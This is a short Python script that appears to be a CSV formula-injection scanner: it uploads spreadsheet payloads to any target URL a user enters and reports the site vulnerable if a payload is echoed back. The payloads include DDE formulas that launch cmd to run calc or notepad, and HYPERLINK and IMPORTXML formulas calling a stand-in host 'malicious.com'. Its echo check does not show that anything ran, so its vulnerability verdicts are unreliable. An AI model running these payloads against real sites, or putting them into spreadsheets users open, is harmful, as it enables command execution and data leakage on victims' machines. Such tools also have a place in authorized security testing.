import requests
import pandas as pd
from urllib.parse import urljoin
from termcolor import colored

def generate_payloads():
    payloads = [
        '";=2+3-1+cmd|\' /C calc\'!A0 //',
        '";=2+3-1+cmd|\' /C notepad\'!A0 //',
        '"=HYPERLINK("http://malicious.com", "Click Here")',
        '=cmd|\' /C calc\'!A0',
        '=cmd|\' /C notepad\'!A0',
        '=IMPORTXML("http://malicious.com", "//")',
        # Add more payloads here as needed
    ]
    return payloads

def check_csv_injection_vulnerability(url):
    print("Checking for CSV Injection vulnerability...")
    target_url = urljoin(url, "vulnerable_endpoint.csv")
    payloads = generate_payloads()
    vulnerable = False
    
    for payload in payloads:
        # Create a sample CSV payload with malicious content
        malicious_csv = f'header1,header2\nvalue1,{payload}'
        
        # Write the payload to a temporary file
        with open('temp.csv', 'w') as file:
            file.write(malicious_csv)
        
        # Upload the payload to the target URL
        files = {'file': open('temp.csv', 'rb')}
        response = requests.post(target_url, files=files)
        
        # Analyze response status code and headers
        status_code = response.status_code
        content_type = response.headers.get('Content-Type', '')
        
        if status_code == 200 and 'text/csv' in content_type:
            # Check if the payload was successfully executed
            if payload in response.text:
                print(colored(f"The target website is vulnerable to CSV Injection with payload: {payload}", 'red'))
                vulnerable = True
            else:
                print(colored(f"The payload {payload} did not trigger any action.", 'yellow'))
        else:
            print(colored(f"Upload failed with status code {status_code}. The website might not support CSV upload or have WAF protection.", 'yellow'))
        
        # Clean up temporary file
        import os
        os.remove('temp.csv')
    
    if not vulnerable:
        print(colored("The target website is not vulnerable to CSV Injection.", 'green'))

if __name__ == "__main__":
    target_website = input("Enter your target website url: ")
    check_csv_injection_vulnerability(target_website)
